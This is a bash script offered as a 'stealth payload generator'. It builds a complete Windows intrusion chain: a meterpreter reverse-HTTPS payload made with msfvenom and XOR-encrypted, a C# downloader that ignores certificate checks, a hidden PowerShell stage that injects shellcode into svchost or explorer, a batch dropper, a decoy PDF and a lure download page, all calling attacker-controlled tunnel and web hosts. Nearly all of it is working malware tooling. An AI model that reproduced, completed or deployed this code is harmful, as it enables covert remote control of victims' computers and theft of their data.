#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – Process Injection Edition
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]

set -e

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# Defaults
TUNNEL_HOST=""; WEB_URL=""; BASE_PATH="/generated"
PAYLOAD_PORT="443"; XOR_KEY="0x6A"; OUTPUT_DIR="./generated"; VISIBLE_MODE=0

show_usage() {
    echo -e "${YELLOW}Usage: $0 -t <tunnel> -u <url> [-v]${NC}"; exit 1
}

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option${NC}"; show_usage ;;
    esac
done

[ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ] && show_usage

WEB_URL="${WEB_URL%/}"
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

echo -e "${GREEN}[✓] Tunnel: $TUNNEL_HOST${NC}"
echo -e "${GREEN}[✓] Full URL: $FULL_BASE_URL${NC}"
echo -e "${GREEN}[✓] XOR Key: $XOR_KEY_DEC${NC}"
echo -e "${GREEN}[✓] Mode: $([ $VISIBLE_MODE -eq 1 ] && echo VISIBLE || echo STEALTH)${NC}"

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR"

B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

# ========== TOOLS ==========
echo -e "${YELLOW}[1/6] Creating payload generator...${NC}"
cat > tools/generate_payload.sh <<EOF
#!/bin/bash
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
[ -z "\$LHOST_IP" ] && LHOST_IP="104.16.231.132"
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="\$LHOST_IP" LPORT="\$PORT" -f raw -o ../output/payload.raw
[ -f ../output/payload.raw ] && echo "✓ Done" || exit 1
EOF
chmod +x tools/generate_payload.sh

echo -e "${YELLOW}[2/6] Creating XOR encryption...${NC}"
cat > tools/xor_encrypt.py <<EOF
#!/usr/bin/env python3
import sys, base64
def xor_encrypt(inf, outf, key):
    with open(inf,'rb') as f: data = f.read()
    enc = bytes([b ^ key for b in data])
    with open(outf,'wb') as f: f.write(enc)
    with open(outf+'.b64','w') as f: f.write(base64.b64encode(enc).decode())
    print(f"✓ Encrypted {len(data)} bytes -> {outf}")
if __name__=="__main__":
    if len(sys.argv)<4: print("Usage: xor_encrypt.py <in> <out> <key>"); sys.exit(1)
    xor_encrypt(sys.argv[1], sys.argv[2], int(sys.argv[3]))
EOF
chmod +x tools/xor_encrypt.py

# ========== C# STAGE2 LOADER (EXE) with FULL LOGGING ==========
echo -e "${YELLOW}[3/6] Creating C# Stage2 loader (file‑based execution)...${NC}"
cat > tools/stage2.cs <<EOF
using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try {
                File.AppendAllText(Path.GetTempPath() + "stage2_log.txt",
                    DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            } catch { }
        }

        static void Main()
        {
            Log("=== Stage2 started ===");
            try
            {
                // Force TLS 1.2 and ignore cert errors
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS configured");

                // Download Stage3 PowerShell script
                string url = "$FULL_BASE_URL/payloads/stage3.ps1";
                Log("Downloading stage3 from: " + url);
                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                string script = client.DownloadString(url);
                Log("Downloaded " + script.Length + " bytes");

                // Write script to a temporary file (more reliable than command line)
                string tempScript = Path.GetTempPath() + "stage3_exec.ps1";
                File.WriteAllText(tempScript, script);
                Log("Script written to: " + tempScript);

                // Execute the script file with PowerShell
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -File \"" + tempScript + "\"";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process p = Process.Start(psi);
                Log("PowerShell process started with PID: " + p.Id);

                // Optionally wait a bit and check if process exited
                System.Threading.Thread.Sleep(1000);
                if (p.HasExited)
                {
                    Log("PowerShell process exited quickly with code: " + p.ExitCode);
                }
                else
                {
                    Log("PowerShell process still running");
                }

                // Download and open decoy PDF
                client.DownloadFile("$FULL_BASE_URL/decoy.pdf", "decoy.pdf");
                Process.Start("decoy.pdf");
                Log("Decoy PDF opened");
            }
            catch (Exception ex)
            {
                Log("ERROR: " + ex.Message);
                if (ex.InnerException != null)
                    Log("INNER ERROR: " + ex.InnerException.Message);
            }
            Log("=== Stage2 finished ===");
        }
    }
}
EOF

# Compile the C# code
if command -v mcs >/dev/null 2>&1; then
    mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs
    echo -e "${GREEN}✓ stage2.exe compiled successfully${NC}"
else
    echo -e "${RED}✗ Mono C# compiler (mcs) not found. Please install it with: sudo apt install mono-mcs${NC}"
    exit 1
fi

# ========== STAGE 3 (PowerShell payload loader) with PROCESS INJECTION ==========
echo -e "${YELLOW}[4/6] Creating Stage3.ps1 (process injection)...${NC}"
cat > payloads/stage3.ps1 <<'EOF'
param()

"Stage3 reached at $(Get-Date)" | Out-File "$env:TEMP\stage3_reached.txt"

$VIS = $false   # will be replaced by sed

function Write-Log {
    param([string]$Msg)
    if ($VIS) {
        $logPath = "$env:TEMP\stage3_debug.txt"
        "$(Get-Date -Format 'HH:mm:ss') - $Msg" | Out-File -FilePath $logPath -Append
        Write-Host "[Stage3] $Msg" -ForegroundColor Cyan
    }
}

Write-Log "=== Stage3 Started ==="

# Add Win32 API definitions for process injection
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Write-Log "Win32 APIs loaded"

# TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {
    Write-Log "TLS config failed"
}

# Decode URL and key
$b64Url = "B64_URL_PLACEHOLDER"
$b64Key = "B64_KEY_PLACEHOLDER"

try {
    $baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Url))
    $payloadUrl = $baseUrl + "/payload.enc"
    Write-Log "Payload URL: $payloadUrl"
} catch {
    Write-Log "URL decode failed"
    exit
}

try {
    $key = [int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Key)))
    Write-Log "XOR key: $key"
} catch {
    Write-Log "Key decode failed"
    exit
}

# Download payload
$downloaded = $false
for ($i=1; $i -le 3; $i++) {
    try {
        Write-Log "Download attempt $i"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $enc = $wc.DownloadData($payloadUrl)
        Write-Log "Downloaded $($enc.Length) bytes"
        $downloaded = $true
        break
    } catch {
        Write-Log "Attempt $i failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if (-not $downloaded) {
    Write-Log "Download failed"
    exit
}

# XOR decrypt
try {
    Write-Log "XOR decrypting..."
    $dec = New-Object byte[] $enc.Length
    for ($i=0; $i -lt $enc.Length; $i++) {
        $dec[$i] = $enc[$i] -bxor $key
    }
    Write-Log "Decrypted $($dec.Length) bytes"
} catch {
    Write-Log "Decryption failed: $($_.Exception.Message)"
    exit
}

# --- Process injection ---
Write-Log "Preparing process injection..."

# Find a suitable target process (e.g., RuntimeBroker.exe, svchost.exe)
$targetProcesses = @("RuntimeBroker", "svchost", "explorer", "dllhost")
$target = $null
foreach ($name in $targetProcesses) {
    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne 0 } | Select-Object -First 1
    if ($proc) {
        $target = $proc
        Write-Log "Target process: $($proc.Name) (PID: $($proc.Id))"
        break
    }
}

if (-not $target) {
    Write-Log "No suitable target process found, falling back to current process"
    # Fallback: execute in current process (might get detected)
    try {
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dec.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $ptr, $dec.Length)
        $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Type]([Action]))
        $delegate.Invoke()
        Write-Log "Payload executed (fallback)"
    } catch {
        Write-Log "Fallback execution failed: $($_.Exception.Message)"
    }
    exit
}

# --- Process injection using Win32 APIs ---
$hProcess = [Win32.Kernel32]::OpenProcess(0x001F0FFF, $false, $target.Id)  # PROCESS_ALL_ACCESS
if ($hProcess -eq 0) {
    Write-Log "OpenProcess failed"
    exit
}

# Allocate memory in the target process
$remoteMemory = [Win32.Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [UInt32]$dec.Length, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
if ($remoteMemory -eq [IntPtr]::Zero) {
    Write-Log "VirtualAllocEx failed"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}

# Write shellcode
$bytesWritten = [UIntPtr]::Zero
$result = [Win32.Kernel32]::WriteProcessMemory($hProcess, $remoteMemory, $dec, [UInt32]$dec.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $dec.Length) {
    Write-Log "WriteProcessMemory failed or incomplete"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "Written $bytesWritten bytes"

# Create remote thread
$threadId = 0
$hThread = [Win32.Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteMemory, [IntPtr]::Zero, 0, [ref]$threadId)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Log "CreateRemoteThread failed"
} else {
    Write-Log "Remote thread created (ID: $threadId)"
    [Win32.Kernel32]::CloseHandle($hThread)
}

# Clean up
[Win32.Kernel32]::CloseHandle($hProcess)
Write-Log "Process injection completed"
Write-Log "=== Stage3 Completed ==="
EOF

sed -i "s|B64_URL_PLACEHOLDER|$B64_URL|g" payloads/stage3.ps1
sed -i "s|B64_KEY_PLACEHOLDER|$B64_KEY|g" payloads/stage3.ps1
if [ $VISIBLE_MODE -eq 1 ]; then
    sed -i 's/\$VIS = \$false/\$VIS = \$true/g' payloads/stage3.ps1
fi

# ========== STAGE 1 (Batch downloader for stage2.exe) with LOGGING ==========
echo -e "${YELLOW}[5/6] Creating Stage1.bat...${NC}"
if [ $VISIBLE_MODE -eq 1 ]; then
    cat > payloads/stage1.bat <<EOF
@echo off
title Stage1 Payload Loader (EXE)
echo [!] Downloading stage2.exe from $FULL_BASE_URL/payloads/stage2.exe
echo %date% %time% - Starting download > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> %TEMP%\stage1_log.txt
    start /B %TEMP%\stage2.exe
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
)
echo [2] Opening decoy.pdf...
echo %date% %time% - Downloading decoy.pdf >> %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
else
    cat > payloads/stage1.bat <<EOF
@echo off
echo %date% %time% - Starting stage1 > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
echo %date% %time% - stage2.exe downloaded >> %TEMP%\stage1_log.txt
start /B %TEMP%\stage2.exe
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
fi

# ========== WEB FILES ==========
echo -e "${YELLOW}[6/6] Creating web files...${NC}"
echo "This document requires a viewer update." > decoy.pdf
cat > index.html <<EOF
<!DOCTYPE html><html><head><title>Document Portal</title></head>
<body><h1>Document Portal</h1><p>Server: $FULL_BASE_URL</p><p>Tunnel: $TUNNEL_HOST</p>
<ul><li><a href="payloads/stage1.bat">Download stage1.bat</a></li></ul></body></html>
EOF

# ========== GENERATE ALL SCRIPT ==========
cat > generate_all.sh <<EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
[ -f output/payload.raw ] && python3 tools/xor_encrypt.py output/payload.raw payload.enc $XOR_KEY_DEC
rm -f output/payload.raw
echo "Files ready for $FULL_BASE_URL: payload.enc decoy.pdf payloads/stage2.exe payloads/stage3.ps1 payloads/stage1.bat index.html"
EOF
chmod +x generate_all.sh

echo -e "${GREEN}✅ DONE! Files created in $OUTPUT_DIR${NC}"
echo "Run: cd $OUTPUT_DIR && ./generate_all.sh"
echo "Then upload all files to $FULL_BASE_URL"
